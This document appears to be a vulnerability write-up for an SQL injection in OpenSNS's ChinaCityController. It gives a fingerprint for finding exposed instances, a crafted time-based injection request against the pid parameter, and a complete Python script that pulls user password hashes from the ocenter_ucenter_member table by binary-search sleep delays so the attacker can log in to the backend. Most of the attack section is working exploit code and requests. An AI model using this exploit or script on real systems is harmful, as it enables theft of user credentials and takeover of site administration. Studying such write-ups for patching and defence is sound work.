# OpenSNS ChinaCityController.class.php SQL injection vulnerability

## Vulnerability Description

In the OpenSNS ChinaCityController.class.php file, you can execute any SQL commands by splicing SQL statements to obtain the user account password.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">OpenSNS</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">icon_hash="1167011145"</span>

## Vulnerability reappears

The login page is as follows

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634371874190-3653480e-380a-4cdc-81fc-7d560bc7d0dc.png)

The file with vulnerability is `Addons/ChinaCity/Controller/ChinaCityController.class.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634530581898-96bfb012-9b06-4000-8688-3f60e59fe5af.png)

The user-controllable parameters are cid and pid, and the SQL statement is viewed through debugging.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634530661937-f8552b8b-a5c2-4633-9cef-e20b31154085.png)

Constructing requests to close SQL statements, causing SQL injection

```php
POST /index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html

cid=0&pid[0]==(select*from(select+sleep(3)union/**/select+1)a)and+1+in+&pid[1]=1
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634531129827-a6c0bd01-e6e8-41a8-a7aa-0d0349843d9e.png)

Through dichotomous delay injection, you can get the user account password and log in to the background

```php
import time
import requests

url = "https://peiqi.com:8888/index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html"

flag = ""
for i in range(1,100):
    low = 32
    high = 128
    while low < high:
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        }
        mid = (low + high)//2
        data = "cid=0&pid[0]==(select*from(select+if(ascii(substr((select/**/password/**/from/**/ocenter_ucenter_member),{},1))<{},sleep(2),1)union/**/select+1)a)and+3+in+&pid[1]=3".format(i,mid)
        timeStart = time.time()
        r = requests.post(url=url, data=data, headers=headers)
        timeEnd = time.time()
        # print(r.text, low, high, data,timeStart-timeEnd)
        if timeEnd - timeStart >= 1: 
            high = mid
        else:
            low = mid + 1
    if low == high == 32:
        print("No  result")
        break
    flag += chr((high + low - 1)//2)
    print(flag)
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634531377138-0fc38dc3-684c-41d1-a3bb-974274f025fd.png)